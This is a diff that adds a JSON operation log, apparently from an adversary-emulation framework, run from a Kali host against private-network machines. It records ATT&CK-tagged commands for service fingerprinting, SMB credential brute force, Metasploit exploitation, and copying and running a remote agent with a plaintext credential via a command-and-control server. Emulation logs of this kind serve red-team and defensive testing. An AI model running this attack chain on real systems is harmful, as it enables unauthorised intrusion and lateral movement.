+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.338877",
+            "run": "2020-03-28 14:37:40",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.339009",
+            "run": "2020-03-28 14:37:41",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.339151",
+            "run": "2020-03-28 14:37:42",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.339319",
+            "run": "2020-03-28 14:37:43",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.339501",
+            "run": "2020-03-28 14:37:44",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "f6a1bedd-8396-4909-92fd-2c2e418d3e90",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c ssh",
+            "delegated": "2020-03-28 14:36:40.339625",
+            "run": "2020-03-28 14:37:45",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SSH",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.339730",
+            "run": "2020-03-28 14:37:46",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.339834",
+            "run": "2020-03-28 14:37:48",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.339936",
+            "run": "2020-03-28 14:37:50",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.340037",
+            "run": "2020-03-28 14:37:52",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.340138",
+            "run": "2020-03-28 14:37:54",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c ftp",
+            "delegated": "2020-03-28 14:36:40.340287",
+            "run": "2020-03-28 14:37:56",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint FTP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.10:445",
+            "delegated": "2020-03-28 14:37:58.408561",
+            "run": "2020-03-28 14:38:02",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.100:445",
+            "delegated": "2020-03-28 14:37:58.408772",
+            "run": "2020-03-28 14:38:12",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.107:445",
+            "delegated": "2020-03-28 14:37:58.408884",
+            "run": "2020-03-28 14:38:03",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.110:445",
+            "delegated": "2020-03-28 14:37:58.408988",
+            "run": "2020-03-28 14:38:05",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.111:445",
+            "delegated": "2020-03-28 14:37:58.409086",
+            "run": "2020-03-28 14:38:05",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "kali$root",
+            "command": "python3 ./bruteForce.py --target 192.168.1.117:445",
+            "delegated": "2020-03-28 14:37:58.409197",
+            "run": "2020-03-28 14:38:03",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.10:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409291",
+            "run": "2020-03-28 14:39:31",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.100:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409386",
+            "run": "2020-03-28 14:40:58",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.107:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409480",
+            "run": "2020-03-28 14:42:24",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.110:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409604",
+            "run": "2020-03-28 14:43:50",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.111:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409748",
+            "run": "2020-03-28 14:45:15",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "4c3d38aa-10bc-4d3e-84cd-021308d0793b",
+            "paw": "kali$root",
+            "command": "python3 metasploit_exploit_port.py --target 192.168.1.117:445 --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:37:58.409900",
+            "run": "2020-03-28 14:46:41",
+            "status": 0,
+            "description": "Use Metasploit to Exploit SMB",
+            "name": "Exploit SMB With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.10:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830231",
+            "run": "2020-03-28 14:46:46",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.100:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830340",
+            "run": "2020-03-28 14:46:48",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.107:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830415",
+            "run": "2020-03-28 14:46:50",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.110:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830484",
+            "run": "2020-03-28 14:46:52",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.111:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830592",
+            "run": "2020-03-28 14:46:54",
+            "status": 0,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "kali$root",
+            "command": "python3 ./smbExec.py --target 192.168.1.117:445 --cred 192.168.1.117:445:zathras:password1! --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830668",
+            "run": "2020-03-28 14:47:00",
+            "status": 1,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+            "paw": "kali$root",
+            "command": "python3 metasploit_sandcat_start.py --server http://192.168.1.250:8888",
+            "delegated": "2020-03-28 14:46:46.830731",
+            "run": "2020-03-28 14:46:59",
+            "status": 0,
+            "description": "Starts a Sandcat Agent on all Metasploit sessions",
+            "name": "Metasploit Start Sandcat",
+            "attack": {
+                "tactic": "execution",
+                "technique_name": "Command-Line Interface",
+                "technique_id": "T1059"
+            }
+        }
+    ]
+}
